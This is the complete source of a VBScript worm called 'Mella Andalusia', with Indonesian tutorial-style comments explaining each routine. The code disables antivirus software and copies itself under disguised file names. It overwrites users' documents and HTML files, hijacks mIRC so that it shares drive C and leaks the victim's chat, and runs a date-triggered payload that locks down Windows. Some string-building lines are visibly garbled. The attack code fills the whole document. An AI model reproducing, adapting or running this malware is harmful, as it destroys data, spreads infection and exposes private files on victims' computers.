'mendeklarasikan variabel(secara implisit), disinilah bagusnya VBS karena hanya ada satu 
'tipe data yaitu Variant, yang menampung segala informasi bahkan objek. 

Dim 
Mella,Mela,Wella,Andalusia,DirektoriWindows,DirektoriSystem,DirektoriTemp,KodeVbs,KodeHtm,Chat,Drives,Drive,Folder,Files,File,Subfolders,Subfolder

'harus ada kalau tidak virus kamu akan berhenti bila terjadi error

On Error Resume Next

'deklarasi global
'membuat objek file system dengan nama Mella

Set Mella = CreateObject("Scripting.FileSystemObject")

'membuat ojek shell dengan nama Wella
Set Wella = CreateObject("WScript.Shell")

'menset supaya vbs kita jalan tanpa timeout
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting 
Host\Settings\Timeout",0, "REG_DWORD"
Wella.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Scripting 
Host\Settings\Timeout",0, "REG_DWORD"

'buka diri sendiri simpan di var Andalusia
Set Andalusia = Mella.OpenTextFile(WScript.ScriptFullName,1)

'set folder C:\Windows untuk Win9x, C:\WinNT untuk WinNT tergantung jenis Windows
Set DirektoriWindows = Mella.GetSpecialFolder(0)

'set folder system windows
Set DirektoriSystem = Mella.GetSpecialFolder(1)

'set folder temp
Set DirektoriTemp = Mella.GetSpecialFolder(2)

'baca andalusia simpan di var KodeVbs
KodeVbs = Andalusia.ReadAll

'tag html untuk menyisipkan vbs kita sebagai script embeded
KodeHtm = "<" & "html><" & "head><" & "title> "head><" & "body><" & "script langua" & "ge=vbscr" & "ipt>" & vbCrLf & "on 
error resume next" & vbCrLf & "set 
mella=createobject(""scripting.filesystemobject"")" & vbCrLf & "if err.number=429 then" & vbCrLf & 
"document.write " & Chr(34) & "
KodeVbs & vbCrLf
KodeHtm = KodeHtm & "document.write " & Chr(34) & "<" & "font 
face='verdana' size='2' color='#FF000" & "0'>This is [Mella Andalusia's] 
document...!, 
You don't have permission to access this document... "font>" & Chr(34) & "" & vbCrLf & "end if" & vbCrLf & " & "body> 'panggil fungsi Svck_AntiVirus()
Svck_AntiVirus()
'panggil sub Fvck_AntiVirus()
Fvck_AntiVirus()
'panggil sub Start()
Start()
'panggil sub Fvck_Reg()
Fvck_Reg()
'panggil sub Tukar_Icon()
Tukar_Icon()
'panggil sub Shorcut()
Shorcut()
'panggil sub CheckDrive()
CheckDrive()
'sub untuk mengakses,membuka dan mengedit win.ini dan system.ini
'pemanggilan sub dengan EditIni(nama_file,seksi,string,string 
baru/tambahan)
Sub EditIni(FileName,Section,String,NewValue)
On Error Resume Next
'konstanta
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile(iniFile, ForReading)
lines = Split(ts.ReadAll,vbCrLf)
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
if bKeyChanged then
Set ts = fso.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
set ts = nothing
set fso = nothing
end sub
'sub menghapus key AntiVirus di registry[bug](ada yang punya cara lain)
Sub Fvck_AntiVirus()
'memakai objek shell yg kita buat untuk mengakses registry
Wella.RegDelete "HKLM\Software\Symantec\"
Wella.RegDelete "HKLM\Software\McAfee\"
Wella.RegDelete "HKLM\Software\TrendMicro\"
Wella.RegDelete "HKLM\Software\KasperskyLab\"
Wella.RegDelete "HKLM\Software\H+BEDV\"
Wella.RegDelete "HKLM\Software\Panda Software\"
Wella.RegDelete "HKLM\Software\Computer Associates\"
Wella.RegDelete "HKLM\Software\FRISK Software International\"
Wella.RegDelete "HKLM\Software\GriSoft\"
Wella.RegDelete "HKLM\Software\Sophos\"
End Sub
'sub meng 'overwrite' autoexec.bat dan winstart.bat
Sub Svck_AntiVirus()
'buat file autoexec.bat, kalau telah ada overwrite!
Set Mela = Mella.CreateTextFile("C:\Autoexec.bat",True)
'tulis isi autoexec.bat
'bila dijalankan akan merename *.* menjadi *.Mella sehingga AntiVirus 
Error
Mela.WriteLine "@echo off"
Mela.WriteLine "ren C:\Progra~1\Symant~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\Norton~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\TrendP~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\AVPers~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\AVP\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\FSI\F-Prot~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\Antivi~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\Comput~1\eTrust~1\eTrust~1\*.* *.Mella"
Mela.WriteLine "ren C:\Progra~1\PandaS~1\*.* *.Mella"
Mela.WriteLine " "
'mengkopi diri sendiri ke C:\mella.bat
Mela.WriteLine "copy %0 c:\mella.bat"
'ubah atribut file jadi hidden dan read only
Mela.WriteLine "attrib c:\mella.bat +h +r"
Mela.WriteLine "echo"
'tutup file autoexec.bat
Mela.Close
'buat file winstart.bat
Set Mela = Mella.CreateTextFile("C:\WINSTART.BAT",True)
'bila dijalankan akan mengaktifkan explorer.vbs
Mela.WriteLine "@Start "&DirektoriWindows&"\explore.vbs"
'tutup file
Mela.Close
'akhir sub
End Sub
'sub membuat backup virus
Sub Start()
'deklarasi var
Dim BackUpVirus
'salin diri sendiri dan simpan di var BackUpVirus
Set BackUpVirus = Mella.GetFile(WScript.ScriptFullName)
'kopi file di C:\%windir%\explorer.vbs
BackUpVirus.Copy(DirektoriWindows&"\explore.vbs")
'kopi file di C:\%Sysdir%\mtask.vbe
BackUpVirus.Copy(DirektoriSystem&"\mtask.vbe")
'kopi file di C:\%Temp%\kernel32.dll
BackUpVirus.Copy(DirektoriTemp&"\kernel32.dll")
'kopi file di C:\Siti-Nurhaliza.jpg.vbs
BackUpVirus.Copy("C:\Siti-Nurhaliza.jpg.vbs")
'kopi file di C:\Mella-Andalusia.gif.vbe
BackUpVirus.Copy("C:\Mella-Andalusia.gif.vbe")
'ubah atribut file jadi hidden
BackUpVirus.Attributes = 2
'tutup file
BackUpVirus.Close
'akhir sub
End Sub
'sub menulis regedit
Sub Fvck_Reg()
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\"
'pesan ketika komputer hidup
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","Microsucks Widows"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","Hai Mella Andalusia..."
'menyisipkan menu di menu klik kanan di direktori
Wella.RegWrite "HKEY_CLASSES_ROOT\Directory\Shell\maVero\","ma&Vero"
'file tujuan menu
Wella.RegWrite 
"HKEY_CLASSES_ROOT\Directory\Shell\maVero\Command\",DirektoriWindows&"\explore.vbs"
'menyisipkan menu di menu klik kanan di drive
Wella.RegWrite "HKEY_CLASSES_ROOT\Drive\Shell\Mella\","Me&lla"
'file tujuan menu ketika diklik
Wella.RegWrite 
"HKEY_CLASSES_ROOT\Drive\Shell\Mella\Command\",DirektoriSystem&"\mtask.vbe"
'menyisipkan menu di menu klik kanan di folder
Wella.RegWrite "HKEY_CLASSES_ROOT\Folder\Shell\Mella\","Me&lla"
'file tujuan menu
Wella.RegWrite 
"HKEY_CLASSES_ROOT\Folder\Shell\Mella\Command\",DirektoriWindows&"\explore.vbs"
'menset option internet explorer
Wella.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\Default_Page_URL","C:\Mella.htm"
Wella.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\Default_Search_URL","C:\Mella.htm"
Wella.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\Local Page","C:\Mella.htm"
Wella.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\Search Page","C:\Mella.htm"
Wella.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\Start Page","C:\Mella.htm"
Wella.RegWrite 
"HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\@","Mella Lives Here"
Wella.RegWrite 
"HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InfoTip","I'm Mella-Andalusia tray"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Main\Start Page","C:\Mella.htm"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Main\Search Page","C:\Mella.htm"
Wella.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet 
Explorer\Main\Window Title", "", "REG_SZ"
Wella.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet 
Explorer\Main\Window Title", "Mella Andalusia", "REG_SZ"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Main\Window Title", "", "REG_SZ"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Main\Window Title", "Mella Andalusia", "REG_SZ"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP\Workgroup","Mella_Andalusia"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EmailName","m@Vero.Tv"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Netscape\Netscape 
Navigator\Main\Autoload Home Page","yes"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Netscape\Netscape 
Navigator\Main\Home Page","C:\Mella.htm"
Wella.RegWrite "HKEY_CURRENT_USER\Software\America Online\AOL Instant 
Messenger (TM)\CurrentVersion\Login\Screen Name","Mella_Andalusia"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\MS Setup 
(ACME)\User Info\DefCompany","Mella-soft"
Wella.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\MS Setup 
(ACME)\User Info\DefName","Mella Andalusia, I never know what is in your heart."
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Mella Andalusia"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization",":: maVeroSoft ::"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Telephony\Country List\1\Name","Payakumbuh Goes to World"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\DeatfulPrefix\(predeterminado)", "Mella:\\"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\www", "Mella:\\"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\home", "Mella:\\" 
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\ftp", "SEND_ME! (MeLLa-ViRuS)"
Wella.RegWrite "HKEY_CURRENT_USER\Control 
Panel\Desktop\Wallpaper","C:\Mella.htm"
Wella.RegWrite "HKEY_CURRENT_USER\Control 
Panel\International\s1159","Mella"
Wella.RegWrite "HKEY_CURRENT_USER\Control 
Panel\International\s2359","Wella"
Wella.RegWrite "HKEY_CURRENT_USER\Control 
Panel\International\sTimeFormat","HH:mm:ss tt"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\","Mella Computer"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OrgOrganization",":: maVeroSoft ::"
Wella.RegWrite 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OrgOwner","Mella Andalusia"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",1,"REG_DWORD"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt",1,"REG_DWORD"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\WebView",1,"REG_DWORD"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\WebViewBarricade",1,"REG_DWORD"
DefaultId = Wella.RegRead("HKEY_CURRENT_USER\Identities\Default User 
ID")
OutLookVersion = 
Wella.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer")
Wella.RegWrite 
"HKEY_CURRENT_USER\Identities\"&DefaultId&"\Software\Microsoft\Outlook Express\"& Left(OutLookVersion,1) &".0\Mail\Compose Use 
Stationery",1,"REG_DWORD"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Options\Mail\EditorPreference",131072,"REG_DWORD"
Wella.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Options\Mail\EditorPreference",131072,"REG_DWORD"
End Sub
'sub untuk mengubah icon file
Sub Tukar_Icon()
Wella.RegWrite "HKEY_CLASSES_ROOT\.VBS\","VBSFile"
Wella.RegWrite "HKEY_CLASSES_ROOT\.VBE\","VBEFile"
'menyalin icon default file jpeg ke file vbs
Wella.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\", 
Wella.RegRead("HKEY_CLASSES_ROOT\jpegfile\DefaultIcon\")
'menyalin icon default file gif ke file vbe
Wella.RegWrite "HKEY_CLASSES_ROOT\VBEFile\DefaultIcon\", 
Wella.RegRead("HKEY_CLASSES_ROOT\giffile\DefaultIcon\")
Wella.RegWrite "HKEY_CLASSES_ROOT\.dll\","dllfile"
Wella.RegWrite "HKEY_CLASSES_ROOT\.dll\Content 
Type","application/x-msdownload"
Wella.RegWrite 
"HKEY_CLASSES_ROOT\dllfile\DefaultIcon\",Wella.RegRead("HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\")
'mengubah program untuk menjalankan file dll
Wella.RegWrite "HKEY_CLASSES_ROOT\dllfile\ScriptEngine\","VBScript"
'letak wscript
Wella.RegWrite "HKEY_CLASSES_ROOT\dllFile\Shell\Open\Command\",DirSys32 
& "WScript.exe ""%1"" %*"
Wella.RegWrite 
"HKEY_CLASSES_ROOT\dllFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
Wella.RegWrite 
"HKEY_CLASSES_ROOT\dllFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
End Sub
'sub membuat shortcut² yang bertujuan ke file² backup virus
Sub Shorcut()
'deklarasi var
Dim MyShortcut, MyDesktop, DesktopPath, DesktopPath2, DesktopPath3, 
DesktopPath4, DesktopPath5, DesktopPath6
'menset letak shortcut 
DesktopPath = Wella.SpecialFolders("Desktop")
DesktopPath2 = Wella.SpecialFolders("StartUp")
DesktopPath3 = Wella.SpecialFolders("SendTo")
DesktopPath4 = Wella.SpecialFolders("Favorites")
DesktopPath5 = Wella.SpecialFolders("Recent")
DesktopPath6 = Wella.SpecialFolders("StartMenu")
'membuat nama² shortcut
Set MyShortcut = Wella.CreateShortcut(DesktopPath & "\Marshanda.lnk")
Set MyShortcut2 = Wella.CreateShortcut(DesktopPath2 & 
"\Agnes-Monica.lnk")
Set MyShortcut3 = Wella.CreateShortcut(DesktopPath3 & 
"\Dian-Sastro.lnk")
Set MyShortcut4 = Wella.CreateShortcut(DesktopPath4 & 
"\Titi-Kamal.lnk")
Set MyShortcut5 = Wella.CreateShortcut(DesktopPath5 & 
"\SpiderMan-3.lnk")
Set MyShortcut6 = Wella.CreateShortcut(DesktopPath6 & 
"\Siti-Nurhaliza.lnk")
'membuat tujuan² shortcut
MyShortcut.TargetPath = 
WSHShell.ExpandEnvironmentStrings(DirektoriWindows&"\explore.vbs")
MyShortcut.Save
MyShortcut2.TargetPath = 
WSHShell.ExpandEnvironmentStrings(DirektoriSystem&"\mtask.vbe")
MyShortcut2.Save
MyShortcut3.TargetPath = 
WSHShell.ExpandEnvironmentStrings(DirektoriTemp&"\kernel32.dll")
MyShortcut3.Save
MyShortcut4.TargetPath = 
WSHShell.ExpandEnvironmentStrings(DirektoriTemp&"\kernel32.dll")
MyShortcut4.Save
MyShortcut5.TargetPath = 
WSHShell.ExpandEnvironmentStrings("C:\Mella-Andalusia.gif.vbe")
MyShortcut5.Save
MyShortcut6.TargetPath = 
WSHShell.ExpandEnvironmentStrings("C:\Siti-Nurhaliza.jpg.vbs")
MyShortcut6.Save
End Sub
'fungsi menginfeksi mIRC
Function Mella_mIRC(Path)
'buat file script.ini di path mirc ditemukan
set Chat=Mella.CreateTextFile(Path & "\script.ini")
Chat.WriteLine "[script]"
'ketika start mIRC remote on
Chat.WriteLine "n0=ON 1:START:{"
Chat.WriteLine "n1=.remote on"
Chat.WriteLine "n2=}"
'ketika mIRC connect buat direktori
Chat.WriteLine "n3=ON 1:CONNECT:{"
Chat.WriteLine "n4=.mkdir c:\Mella_Andalusia"
Chat.WriteLine "n5=.mkdir c:\Mella_Andalusia\Live_In"
Chat.WriteLine "n6=.mkdir c:\Mella_Andalusia\Live_In\Your_PC"
Chat.WriteLine "n7=.mkdir c:\Mella_Andalusia\Live_In\Your_PC\Made_by"
Chat.WriteLine "n8=.mkdir 
c:\Mella_Andalusia\Live_In\Your_PC\Made_by\maVero"
'set email
Chat.WriteLine "n9=.emailaddr Mella@mella.com"
'set fullname
Chat.WriteLine "n10=.fullname :: Mella Andalusia ::"
'autojoin channel
Chat.WriteLine "n11=.join #bandung,#Bali,#surabaya,#unp"
Chat.WriteLine "n12=.join #padang,#medan,#jakarta,#malang"
Chat.WriteLine "n13=.join #bawel,#indonesia,#payakumbuh,#denpasar"
Chat.WriteLine "n14=}"
'bila ada yg join kirim message
Chat.WriteLine "n15=ON 1:JOIN:#:if ($nick != $me) .msg $nick hi"
'bila ada yg part kirim message
Chat.WriteLine "n16=ON 1ART:#:if ($nick != $me) .msg $nick hai"
'bila di invite kirim message
Chat.WriteLine "n17=ON 1:INVITE:*: .msg $nick mohon jangan di invite 
join channel #unp aja.."
'bila di notice kirim notice
Chat.WriteLine "n18=ON 1:NOTICE:*: .notice $nick notice2 baa ko"
'bila ada text ö di channel sharing drive c:
Chat.WriteLine "n19=ON 1:TEXT:*ö*:#:.fserve $nick 1 c:\"
'bila ada text ping di channel, notice ping
Chat.WriteLine "n20=ON 1:TEXT:*ping*:#:.notice $nick PING Time for 
$nick is : $duration($calc($ctime - $2)) $+ ."
'artikan sendiri selanjutnya.. be creative bro
Chat.WriteLine "n21=ON 1:TEXT:*por*:*:.ignore $nick"
Chat.WriteLine "n22=ON 1:TEXT:*lag*:#:.notice $nick itulah jan pakai 
TelkomNet Instan juo..."
Chat.WriteLine "n23=ON 1:TEXT:*bye*:#:.notice $nick bye juga $nick ..."
Chat.WriteLine "n24=ON 1:TEXT:*gtg*:#:.notice $nick eh $nick jangan 
pergi dulu..."
Chat.WriteLine "n25=ON 1:TEXT:*Hilman*:#:.notice anton Nick = $nick . 
IP = $ip . Server = $server $+ : $+ $port $+ . URL = $url ."
Chat.WriteLine "n26=ON 1:TEXT:*a*:?:{"
Chat.WriteLine "n27=.msg $nick ngomong di #unp aja yuk.."
Chat.WriteLine "n28=}"
Chat.WriteLine "n29=;fkghkfgdkfgkdfi7k5f7g6k7kd86khkgk"
Chat.WriteLine "n30=ON 1:TEXT:*i*:?:{"
Chat.WriteLine "n31=.msg $nick $me tunggu di #unp"
Chat.WriteLine "n32=}"
Chat.WriteLine "n33=;dfk67k76hk67d76k6hk6cvhk6v7b7v6ckv76bvc6gh6hk"
Chat.WriteLine "n34=ON 1:TEXT:*u*:?:{"
Chat.WriteLine "n35=.msg $nick join dulu #unp baru $me jawab.. ok"
Chat.WriteLine "n36=}"
Chat.WriteLine "n37=;xg67 kn7gh7xj76df7gjf7g6f7"
Chat.WriteLine "n38=ON 1:TEXT:*e*:?:{"
Chat.WriteLine "n39=.msg $nick inul nunggu kamu tuh di #unp"
Chat.WriteLine "n40=}"
Chat.WriteLine "n41=;xd7fk8dfgk6cg876kg76gt6jtg7f6ji7fgj"
Chat.WriteLine "n42=ON 1:TEXT:*o*:?:{"
Chat.WriteLine "n43=.msg $nick ada yang nanyain kamu di #unp"
Chat.WriteLine "n44=}"
Chat.WriteLine "n45=;xfg7j78fd7j7idjt7fj76g95x"
Chat.WriteLine "n46=ON 1:TEXT:*x*:?:.ignore $nick"
Chat.WriteLine "n47=ON 1:TEXT:*www*:?:.ignore $nick"
Chat.WriteLine "n48=ON 1:TEXT:*http*:?:.ignore $nick"
'mempaste di channel #unp perkataan chat korban
Chat.WriteLine "n49=ON 1:INPUT:*:{"
Chat.WriteLine "n50=.msg #unp ( $+ $active $+ ) $1-"
Chat.WriteLine "n51=set %maVero status window"
Chat.WriteLine "n52=if ( $active == %maVero ) { $1- | halt }"
Chat.WriteLine "n53=}"
'pesan keluar mIRC
Chat.WriteLine "n54=ON 1:QUIT:.ame mau liat situs www.marshanda.org 
www.agnes-monica.info www.dian-sastro.net www.titi-kamal.com dan 
www.siti-nurhaliza.info dulu! bye.."
Chat.Close
end function
'sub mencari file di harddisk
Sub CheckDrive()
Set Drives=Mella.drives
'untuk semua drive yg ada
For Each Drive In Drives
'jika drive aktif panggil CheckDrive()
If Drive.IsReady Then
Cari Drive & "\" 
End If
'jika tipe drive ...
If Drive.DriveType="2" Or Drive.DriveType="3" Then
'panggil fungsi Cari()
Cari Drive & "\"
End If
Next
CheckDrive()
End Sub
'fungsi mencari file berdasarkan ekstensinya
Function Cari(Path)
Set Folder=Mella.GetFolder(Path)
Set Files=Folder.Files
'untuk setiap file
For Each File In Files
'periksa ekstensi
If Mella.GetExtensionName(File.Path)="wav" Or 
Mella.GetExtensionName(File.Path)="midi" Or Mella.GetExtensionName(File.Path)="mpg" Or 
Mella.GetExtensionName(File.Path)="mpeg" Or 
Mella.GetExtensionName(File.Path)="jpg" Or Mella.GetExtensionName(File.Path)="gif" Or 
Mella.GetExtensionName(File.Path)="bmp" Then
'salin nama asli file
NamaAsli=Mella.GetBaseName(File.Path)
Set Atribut = Mella.GetFile(File.Path)
'mengubah atribut jadi hidden
Atribut.Attributes = Atribut.Attributes + 2
'buat file 'nama asli'.vbs
Set Mela=Mella.CreateTextFile(File.ParentFolder & "\" & NamaAsli & 
".vbs")
'salin virus
Mela.Write KodeVbs
'tutup file
Mela.Close()
End If
'cek ekstensi
If Mella.GetExtensionName(File.Path)="htm" 
Mella.GetExtensionName(File.Path)="html" Or Mella.GetExtensionName(File.Path)="htt" Or 
Mella.GetExtensionName(File.Path)="asp" Or Mella.GetExtensionName(File.Path)="php" 
Then
'overwrite
Set Mela=Mella.CreateTextFile(File.Path)
'salin virus
Mela.Write KodeHtm
'tutup file
Mela.Close()
End If
'periksa ekstensi
If Mella.GetExtensionName(File.Path)="doc" Or 
Mella.GetExtensionName(File.Path)="xls" Or Mella.GetExtensionName(File.Path)="ppt" Or 
Mella.GetExtensionName(File.Path)="mdb" Or 
Mella.GetExtensionName(File.Path)="rtf" Or Mella.GetExtensionName(File.Path)="txt" Then
'overwrite!
Set OverW=Mella.CreateTextFile(File.Path)
'isi file yg di overwrite
OverW.WriteLine " Congratulation!"
OverW.WriteLine " "
OverW.WriteLine " if you can read this information, you have correctly 
installed"
OverW.WriteLine " my virus on your computer."
OverW.WriteLine " "
OverW.WriteLine " The information below describes my virus details."
OverW.WriteLine " 
_____________________________________________________________"
OverW.WriteLine " 
ššššššššššššššššššššššššššššššššššššššššššššššššššššššššššššš"
OverW.WriteLine " š ¤ VBS.Mella ¤ 
š"
OverW.WriteLine " š by mäVerö 
š"
OverW.WriteLine " š august © 2004 
š"
OverW.WriteLine " 
ššššššššššššššššššššššššššššššššššššššššššššššššššššššššššššš"
OverW.WriteLine " "
OverW.WriteLine " švirus name_"
OverW.WriteLine " ¤ Mella_Andalusia(vbs)"
OverW.WriteLine " šwritten in_"
OverW.WriteLine " ¤ Payakumbuh/West Sumatra/Indonesia"
OverW.WriteLine " šdate_"
OverW.WriteLine " ¤ October 2004"
OverW.WriteLine " šspecial thank's to_"
OverW.WriteLine " ¤ [K]alamar,crayolarx,kefi,alcopaul, sevenC,iwing"
OverW.WriteLine " šgreets_"
OverW.WriteLine " ¤ 
d-e-n-I,adhe,kesepian,joehunt,rinal,phatygeni,khepri`,"
OverW.WriteLine " ¤ mayat,ob|wan,vuem,jejeng etc"
OverW.WriteLine " ¤ all people in #unp,#payakumbuh,#indovirus,#cchome 
@DALnet"
OverW.WriteLine " ¤ all people in #payakumbuh,#padang,#pekanbaru 
@Allnetwork"
OverW.WriteLine " "
OverW.WriteLine " ¤ Taste my code dumb!"
OverW.WriteLine " "
OverW.WriteLine " Copyright©2004 - maVero®"
OverW.WriteLine " All Rights Reserved"
OverW.WriteLine " 
_____________________________________________________________"
OverW.WriteLine " 
ššššššššššššššššššššššššššššššššššššššššššššššššššššššššššššš"
OverW.WriteLine " Computer System/Electronic Department/Padang State 
University"
OverW.Close
End If
'jika win.ini ditemukan
If File.Name="win.ini" Then
'panggil fungsi editini()
editini File.ParentFolder & 
"\win.ini","[windows]","load",DirektoriWindows&"\explore.vbs"
editini File.ParentFolder & 
"\win.ini","[windows]","run",DirektoriSystem&"\mtask.vbe"
End If
'jika file system.ini ditemukan
If File.Name="system.ini" Then
'panggil fungsi editini()
editini File.ParentFolder & 
"\system.ini","[boot]","shell","Explorer.exe "&DirektoriSystem&"\mtask.vbe"
End If
'jika mirc ditemukan
If File.Name="mirc.ini" Then
'panggil fungsi mella_mirc
Mella_mIRC File.ParentFolder
editini File.ParentFolder & 
"\mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
editini File.ParentFolder & 
"\mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0"
editini File.ParentFolder & 
"\mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1"
End If
'jika file ditemukan(script blocker=memblok akses 
createtextfile,regread,regdelete,openfile,dll
If File.Name="sbserv.exe" Then
'hapus!
Mella.DeleteFile(File.Path)
End If
'jika ditemukan deep freeze
If File.Name="frzstate.exe" Then
'hapus!
Mella.DeleteFile(File.Path)
End If
'blank.htm = untuk dikirim denga email
If File.Name="blank.htm" Then
Set Mela = Mella.CreateTextFile(File.Path)
'tulis virus
Mela.Write KodeHtm
Mela.close
End If
'jika folder.htt ditemukan
If File.Name="folder.htt" Then
Set Atribut = Mella.GetFile(File.Path)
'set atribut hidden
Atribut.Attributes = Atribut.Attributes + 2
Set Mela = Mella.CreateTextFile(File.Path)
'overwrite dengan kode virus
Mela.Write KodeHtm
Mela.close
End If
'payload jika tanggal sekarang 13 dan bulan sekarang maret
If Day(Now)=13 and Month(Now)=3 Then
'pesan
MsgBox "Selamat Ulang Tahun..." & Vbcrlf & "maVero 
sayang!",vbexclamation,".:: Mella Andalusia ::."
'disable desktop,regedit,run,drive,display cpanel,shutdown,dos
Wella.RegWrite 
"HKLM\Software\Microsoft\Windows\CurrentVersion\SM_AccessoriesName", "Mella_Andalusia"
Wella.RegWrite 
"HKLM\Software\Microsoft\Windows\CurrentVersion\PF_AccessoriesName", "Mella_Andalusia"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispCpl", 1, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
Wella.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
End If
Next
'cari juga di sub folder
Set SubFolders=Folder.SubFolders
For Each Subfolder In Subfolders
Cari Subfolder.Path 
Next
End Function
'huaaaahhh.... akhirnya siap juga dah jam 12:32 man.. wah blom makan 
nech..
